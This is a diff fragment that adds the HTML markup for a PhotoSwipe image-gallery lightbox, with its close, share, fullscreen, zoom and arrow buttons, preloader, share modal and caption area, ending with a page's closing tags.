+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
